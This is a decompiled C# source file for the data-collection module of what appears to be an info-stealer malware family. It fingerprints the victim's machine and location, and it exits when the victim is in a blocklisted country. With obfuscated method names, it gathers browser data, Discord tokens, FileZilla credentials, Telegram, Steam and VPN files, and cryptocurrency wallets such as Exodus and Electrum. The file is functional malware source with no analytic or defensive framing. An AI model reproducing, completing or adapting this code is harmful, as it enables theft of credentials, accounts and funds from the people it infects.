using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;

// Token: 0x02000023 RID: 35
public static class ResultFactory
{
	// Token: 0x06000089 RID: 137 RVA: 0x000062DC File Offset: 0x000044DC
	static ResultFactory()
	{
		Random rnd = new Random();
		ResultFactory.Actions = (from x in ResultFactory.Actions
		orderby rnd.Next()
		select x).ToArray<ResultFactory.ParsingStep>();
	}

	// Token: 0x0600008A RID: 138 RVA: 0x00006480 File Offset: 0x00004680
	public static bool sl9HSDF234(ScanningArgs settings, ref ScanResult result)
	{
		bool result2;
		try
		{
			result.ScanDetails = new ScanDetails
			{
				AvailableLanguages = new List<string>(),
				Browsers = new List<ScannedBrowser>(),
				FtpConnections = new List<Account>(),
				GameChatFiles = new List<ScannedFile>(),
				GameLauncherFiles = new List<ScannedFile>(),
				InstalledBrowsers = new List<BrowserVersion>(),
				MessageClientFiles = new List<ScannedFile>(),
				NordAccounts = new List<Account>(),
				Open = new List<ScannedFile>(),
				Processes = new List<string>(),
				Proton = new List<ScannedFile>(),
				ScannedFiles = new List<ScannedFile>(),
				ScannedWallets = new List<ScannedFile>(),
				SecurityUtils = new List<string>(),
				Softwares = new List<string>(),
				SystemHardwares = new List<SystemHardware>()
			};
			ResultFactory.AKSFD8H23(settings, ref result);
			foreach (ResultFactory.ParsingStep parsingStep in ResultFactory.Actions)
			{
				try
				{
					parsingStep(settings, ref result);
				}
				catch
				{
				}
			}
			result2 = true;
		}
		catch
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600008B RID: 139 RVA: 0x0000659C File Offset: 0x0000479C
	public static void AKSFD8H23(ScanningArgs settings, ref ScanResult result)
	{
		GeoInfo geoInfo = GeoHelper.Get();
		geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
		geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
		geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
		geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
		List<string> blockedCountry = settings.BlockedCountry;
		if (blockedCountry != null && blockedCountry.Count > 0 && settings.BlockedCountry.Contains(geoInfo.Country))
		{
			Environment.Exit(0);
		}
		List<string> blockedIP = settings.BlockedIP;
		if (blockedIP != null && blockedIP.Count > 0 && settings.BlockedIP.Contains(geoInfo.IP))
		{
			Environment.Exit(0);
		}
		result.IPv4 = geoInfo.IP;
		result.City = geoInfo.Location;
		result.Country = geoInfo.Country;
		result.ZipCode = geoInfo.PostalCode;
	}

	// Token: 0x0600008C RID: 140 RVA: 0x000066BF File Offset: 0x000048BF
	public static void asdkadu8(ScanningArgs settings, ref ScanResult result)
	{
		result.Hardware = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	// Token: 0x0600008D RID: 141 RVA: 0x000066EF File Offset: 0x000048EF
	public static void sdfo8n234(ScanningArgs settings, ref ScanResult result)
	{
		result.FileLocation = Assembly.GetExecutingAssembly().Location;
	}

	// Token: 0x0600008E RID: 142 RVA: 0x00006701 File Offset: 0x00004901
	public static void sdfi35sdf(ScanningArgs settings, ref ScanResult result)
	{
		result.Language = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
		result.TimeZone = TimeZoneInfo.Local.DisplayName;
		result.OSVersion = SystemInfoHelper.GetWindowsVersion();
	}

	// Token: 0x0600008F RID: 143 RVA: 0x00006734 File Offset: 0x00004934
	public static void asd44123(ScanningArgs settings, ref ScanResult result)
	{
		if (ResultFactory.<>o__7.<>p__1 == null)
		{
			ResultFactory.<>o__7.<>p__1 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(ResultFactory)));
		}
		Func<CallSite, object, string> target = ResultFactory.<>o__7.<>p__1.Target;
		CallSite <>p__ = ResultFactory.<>o__7.<>p__1;
		if (ResultFactory.<>o__7.<>p__0 == null)
		{
			ResultFactory.<>o__7.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.None, "ToString", null, typeof(ResultFactory), new CSharpArgumentInfo[]
			{
				CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
			}));
		}
		result.Resolution = target(<>p__, ResultFactory.<>o__7.<>p__0.Target(ResultFactory.<>o__7.<>p__0, MonitorHelper.MonitorSize()));
	}

	// Token: 0x06000090 RID: 144 RVA: 0x000067D6 File Offset: 0x000049D6
	public static void sdf934asd(ScanningArgs settings, ref ScanResult result)
	{
		result.MachineName = Environment.UserName;
	}

	// Token: 0x06000091 RID: 145 RVA: 0x000067E4 File Offset: 0x000049E4
	public static void asdk9345asd(ScanningArgs settings, ref ScanResult result)
	{
		foreach (SystemHardware item in SystemInfoHelper.GetProcessors())
		{
			result.ScanDetails.SystemHardwares.Add(item);
		}
	}

	// Token: 0x06000092 RID: 146 RVA: 0x00006840 File Offset: 0x00004A40
	public static void a03md9ajsd(ScanningArgs settings, ref ScanResult result)
	{
		foreach (SystemHardware item in SystemInfoHelper.GetGraphicCards())
		{
			result.ScanDetails.SystemHardwares.Add(item);
		}
	}

	// Token: 0x06000093 RID: 147 RVA: 0x0000689C File Offset: 0x00004A9C
	public static void asdk8jasd(ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.InstalledBrowsers = SystemInfoHelper.GetBrowsers();
	}

	// Token: 0x06000094 RID: 148 RVA: 0x000068B0 File Offset: 0x00004AB0
	public static void лыв7рыва2(ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.SystemHardwares.Add(new SystemHardware
		{
			Name = new string(new char[]
			{
				'T',
				'o',
				't',
				'a',
				'l',
				' ',
				'o',
				'f',
				' ',
				'R',
				'A',
				'M'
			}),
			HardType = HardwareType.Graphic,
			Counter = SystemInfoHelper.TotalOfRAM()
		});
	}

	// Token: 0x06000095 RID: 149 RVA: 0x00006903 File Offset: 0x00004B03
	public static void ылв92р34выа(ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.Softwares = SystemInfoHelper.ListOfPrograms();
	}

	// Token: 0x06000096 RID: 150 RVA: 0x00006915 File Offset: 0x00004B15
	public static void аловй(ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.SecurityUtils = SystemInfoHelper.GetFirewalls();
	}

	// Token: 0x06000097 RID: 151 RVA: 0x00006927 File Offset: 0x00004B27
	public static void ыал8р45(ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.Processes = SystemInfoHelper.ListOfProcesses();
	}

	// Token: 0x06000098 RID: 152 RVA: 0x00006939 File Offset: 0x00004B39
	public static void ываш9р34(ScanningArgs settings, ref ScanResult result)
	{
		result.ScanDetails.AvailableLanguages = SystemInfoHelper.AvailableLanguages();
	}

	// Token: 0x06000099 RID: 153 RVA: 0x0000694B File Offset: 0x00004B4B
	public static void длвап9345(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanScreen)
		{
			result.Monitor = MonitorHelper.Parse();
		}
	}

	// Token: 0x0600009A RID: 154 RVA: 0x00006960 File Offset: 0x00004B60
	public static void ывал8н34(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanTelegram)
		{
			result.ScanDetails.MessageClientFiles.AddRange(FileScanner.Scan(new FileScannerRule[]
			{
				new DesktopMessangerRule()
			}));
		}
	}

	// Token: 0x0600009B RID: 155 RVA: 0x0000698D File Offset: 0x00004B8D
	public static void вал93тфыв(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanBrowsers)
		{
			result.ScanDetails.Browsers.AddRange(C_h_r_o_m_e.Scan(settings.ScanChromeBrowsersPaths));
			result.ScanDetails.Browsers.AddRange(Gecko.Scan(settings.ScanGeckoBrowsersPaths));
		}
	}

	// Token: 0x0600009C RID: 156 RVA: 0x000069CD File Offset: 0x00004BCD
	public static void вашу0л34(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFiles)
		{
			result.ScanDetails.ScannedFiles = RecoursiveFileGrabber.Scan(settings.ScanFilesPaths);
		}
	}

	// Token: 0x0600009D RID: 157 RVA: 0x000069ED File Offset: 0x00004BED
	public static void навева(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanFTP)
		{
			result.ScanDetails.FtpConnections = FileZilla.Scan();
		}
	}

	// Token: 0x0600009E RID: 158 RVA: 0x00006A08 File Offset: 0x00004C08
	public static void ащы9р34(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanWallets)
		{
			result.ScanDetails.ScannedWallets = new List<ScannedFile>();
			BrowserExtensionsRule browserExtensionsRule = new BrowserExtensionsRule();
			browserExtensionsRule.SetPaths(settings.ScanChromeBrowsersPaths);
			result.ScanDetails.ScannedWallets.AddRange(FileScanner.Scan(new FileScannerRule[]
			{
				new ArmoryRule(),
				new AtomicRule(),
				new CoinomiRule(),
				new ElectrumRule(),
				new EthRule(),
				new ExodusRule(),
				new GuardaRule(),
				new Jx(),
				new AllWalletsRule(),
				browserExtensionsRule
			}));
		}
	}

	// Token: 0x0600009F RID: 159 RVA: 0x00006AAB File Offset: 0x00004CAB
	public static void ыва83о4тфыв(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanDiscord)
		{
			ScanDetails scanDetails = result.ScanDetails;
			IEnumerable<ScannedFile> tokens = DiscordRule.GetTokens();
			scanDetails.GameChatFiles = ((tokens != null) ? tokens.ToList<ScannedFile>() : null);
		}
	}

	// Token: 0x060000A0 RID: 160 RVA: 0x00006AD1 File Offset: 0x00004CD1
	public static void askd435(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanSteam)
		{
			result.ScanDetails.GameLauncherFiles = FileScanner.Scan(new FileScannerRule[]
			{
				new GameLauncherRule()
			});
		}
	}

	// Token: 0x060000A1 RID: 161 RVA: 0x00006AFC File Offset: 0x00004CFC
	public static void sdi845sa(ScanningArgs settings, ref ScanResult result)
	{
		if (settings.ScanVPN)
		{
			result.ScanDetails.NordAccounts = new List<Account>();
			result.ScanDetails.Open = FileScanner.Scan(new FileScannerRule[]
			{
				new OpenVPNRule()
			});
			result.ScanDetails.Proton = FileScanner.Scan(new FileScannerRule[]
			{
				new ProtonVPNRule()
			});
		}
	}

	// Token: 0x17000004 RID: 4
	// (get) Token: 0x060000A2 RID: 162 RVA: 0x00006B5D File Offset: 0x00004D5D
	// (set) Token: 0x060000A3 RID: 163 RVA: 0x00006B64 File Offset: 0x00004D64
	public static ResultFactory.ParsingStep[] Actions { get; set; } = new ResultFactory.ParsingStep[]
	{
		new ResultFactory.ParsingStep(ResultFactory.asdkadu8),
		new ResultFactory.ParsingStep(ResultFactory.sdfo8n234),
		new ResultFactory.ParsingStep(ResultFactory.sdfi35sdf),
		new ResultFactory.ParsingStep(ResultFactory.sdf934asd),
		new ResultFactory.ParsingStep(ResultFactory.asdk9345asd),
		new ResultFactory.ParsingStep(ResultFactory.a03md9ajsd),
		new ResultFactory.ParsingStep(ResultFactory.asdk8jasd),
		new ResultFactory.ParsingStep(ResultFactory.лыв7рыва2),
		new ResultFactory.ParsingStep(ResultFactory.ылв92р34выа),
		new ResultFactory.ParsingStep(ResultFactory.аловй),
		new ResultFactory.ParsingStep(ResultFactory.ыал8р45),
		new ResultFactory.ParsingStep(ResultFactory.ываш9р34),
		new ResultFactory.ParsingStep(ResultFactory.длвап9345),
		new ResultFactory.ParsingStep(ResultFactory.ывал8н34),
		new ResultFactory.ParsingStep(ResultFactory.вал93тфыв),
		new ResultFactory.ParsingStep(ResultFactory.вашу0л34),
		new ResultFactory.ParsingStep(ResultFactory.навева),
		new ResultFactory.ParsingStep(ResultFactory.ащы9р34),
		new ResultFactory.ParsingStep(ResultFactory.ыва83о4тфыв),
		new ResultFactory.ParsingStep(ResultFactory.askd435),
		new ResultFactory.ParsingStep(ResultFactory.sdi845sa),
		new ResultFactory.ParsingStep(ResultFactory.asd44123)
	};

	// Token: 0x02000024 RID: 36
	// (Invoke) Token: 0x060000A5 RID: 165
	public delegate void ParsingStep(ScanningArgs settings, ref ScanResult result);
}
